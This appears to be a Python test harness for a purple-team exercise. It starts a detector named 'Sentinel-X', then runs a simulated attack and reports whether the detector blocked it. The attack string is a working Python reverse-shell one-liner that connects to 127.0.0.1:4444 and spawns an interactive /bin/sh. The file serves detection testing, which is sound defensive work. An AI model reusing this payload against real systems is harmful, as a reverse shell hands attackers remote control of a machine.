import subprocess
import time
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)

def run_battle():
    print(f"{Fore.MAGENTA}==========================================")
    print(f"⚔️  BATTLE ROYALE: PurpleReign vs. Sentinel-X")
    print(f"=========================================={Style.RESET_ALL}")

    # 1. Start Sentinel-X (Background)
    # We use preexec_fn=os.setsid to ensure we can kill the whole process group later
    sentinel_log = open("sentinel.log", "w")
    sentinel = subprocess.Popen(
        [sys.executable, "PurpleReign/tests/sentinel_x.py"],
        stdout=sentinel_log,
        stderr=sentinel_log,
        preexec_fn=os.setsid
    )
    print(f"{Fore.BLUE}[SETUP] Sentinel-X deployed (PID: {sentinel.pid})...{Style.RESET_ALL}")
    time.sleep(2) # Give it time to initialize

    # 2. Launch Attack (Red Team)
    print(f"{Fore.RED}[ATTACK] Launching Critical Threat (Stealth Python C2)...{Style.RESET_ALL}")
    
    # We use the Evasion Payload: Python Sockets
    payload = (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"127.0.0.1\",4444));"
        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    )
    
    attack_cmd = f"bash -c 'sleep 1; echo \"Simulating Stealth C2...\"; {payload}; sleep 2'"
    
    try:
        start_t = time.time()
        attacker = subprocess.Popen(
            attack_cmd, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        
        # Wait to see if it survives
        try:
            attacker.wait(timeout=5)
            # If we are here, it finished naturally (or failed connection)
            # But was it KILLED?
            if attacker.returncode == -9 or attacker.returncode == 137:
                result = "KILLED"
            else:
                result = "SURVIVED"
        except subprocess.TimeoutExpired:
            # If it runs too long (waiting for connection), it survived the kill
            result = "SURVIVED (Timeout)"
            attacker.kill()

    except Exception as e:
        print(f"Error launching attack: {e}")
        result = "ERROR"

    # 3. Analyze Results
    print(f"{Fore.YELLOW}[RESULT] Attack Status: {result}{Style.RESET_ALL}")
    
    # Check Sentinel Logs
    sentinel.terminate()
    sentinel_log.close()
    
    with open("sentinel.log", "r") as f:
        logs = f.read()
        
    if "BLOCKED CRITICAL THREAT" in logs:
        print(f"\n{Fore.GREEN}🏆 WINNER: SENTINEL-X (Blue Team){Style.RESET_ALL}")
        print("The AI Defense successfully identified and terminated the threat.")
    elif result == "SURVIVED":
        print(f"\n{Fore.RED}🏆 WINNER: PURPLE REIGN (Red Team){Style.RESET_ALL}")
        print("The attack bypassed the sensors or was not considered critical enough.")
    else:
        print("\nDraw / Inconclusive.")

    print("\n--- Sentinel-X Logs ---")
    print(logs)

if __name__ == "__main__":
    run_battle()
